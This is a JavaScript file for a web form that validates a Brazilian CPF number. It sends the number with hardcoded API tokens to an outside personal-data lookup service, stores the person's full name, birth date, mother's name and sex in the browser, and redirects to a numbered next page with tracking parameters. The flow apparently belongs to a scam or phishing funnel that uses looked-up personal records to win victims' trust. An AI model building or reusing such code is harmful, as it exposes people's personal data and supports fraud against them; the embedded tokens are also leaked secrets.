// Função para obter as UTMs da URL atual
function getCurrentUTMs() {
  const queryString = window.location.search;
  return queryString ? queryString : '';
}

// Modal functionality
function initModals() {
document.querySelectorAll('[data-modal]').forEach(trigger => {
  trigger.addEventListener('click', () => {
    const modalId = trigger.dataset.modal;
    document.getElementById(modalId).classList.add('is-active');
  });
});

document.querySelectorAll('.modal__close').forEach(button => {
  button.addEventListener('click', () => {
    button.closest('.modal').classList.remove('is-active');
  });
});
}

// CPF input mask
function initCpfMask() {
const cpfInput = document.getElementById('cpf');

cpfInput.addEventListener('input', (e) => {
  let value = e.target.value.replace(/\D/g, '');
  
  if (value.length > 11) {
    value = value.slice(0, 11);
  }
  
  if (value.length > 9) {
    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
  } else if (value.length > 6) {
    value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
  } else if (value.length > 3) {
    value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
  }
  
  e.target.value = value;
});
}

// High contrast mode
function toggleContrast() {
document.body.classList.toggle('high-contrast');
}

// Function to validate CPF
function isValidCPF(cpf) {
cpf = cpf.replace(/\D/g, '');
if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

let sum = 0, remainder;
for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
remainder = (sum * 10) % 11;
if (remainder === 10 || remainder === 11) remainder = 0;
if (remainder !== parseInt(cpf.substring(9, 10))) return false;

sum = 0;
for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
remainder = (sum * 10) % 11;
if (remainder === 10 || remainder === 11) remainder = 0;
if (remainder !== parseInt(cpf.substring(10, 11))) return false;

return true;
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
initModals();
initCpfMask();

const cpfInput = document.getElementById('cpf');
const continueCpfButton = document.getElementById('continue-cpf');
const submitContainer = document.getElementById('submit-container');

// Ao clicar no botão "Continuar"
continueCpfButton.addEventListener('click', async () => {
  // Verifica se o CPF é válido
  if (isValidCPF(cpfInput.value)) {
    submitContainer.style.display = 'none'; // Esconde o botão de envio
    localStorage.setItem('cpf', cpfInput.value);

    // Chama a função para submeter o formulário à API
    await submitForm();
  } else {
    alert('CPF inválido. Por favor, insira um CPF válido.');
  }
});

async function submitForm() {
  const cpf = cpfInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
  const token = 'zLg9sfCTl2ohn7fq6enPlMaTcPIaCf10719958'; 
  
  let CPFNOVO = cpf; // Seu token

  if (CPFNOVO.length === 11) {
    try {
      const response = await fetch(`https://searchapi.dnnl.live/consulta?cpf=${CPFNOVO}&token_api=Th4scEP8zJxIEX02`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`Erro na requisição. Status: ${response.status}`);
      }

      const data = await response.json();

      if (data.status === 200 && data.dados && data.dados[0]) {
        const usuario = data.dados[0];
        
        // Extrai o primeiro nome
        const primeiroNome = usuario.NOME.split(" ")[0];

        // Armazena o primeiro nome no sessionStorage
        sessionStorage.setItem('primeiroNome', primeiroNome);

        // Armazena os demais dados
        sessionStorage.setItem('nomeCompleto', usuario.NOME);
        sessionStorage.setItem('dataNascimento', usuario.NASC);
        sessionStorage.setItem('nomeMae', usuario.NOME_MAE);
        sessionStorage.setItem('sexo', usuario.SEXO);

        window.location.href = "../page-03" + window.location.search;
      } else {
        alert("CPF não encontrado ou inválido.");
      }
    } catch (error) {
      alert("Erro ao consultar a API: " + error.message);
    }
  } else {
    alert("CPF inválido. Por favor, preencha corretamente.");
  }
}
});
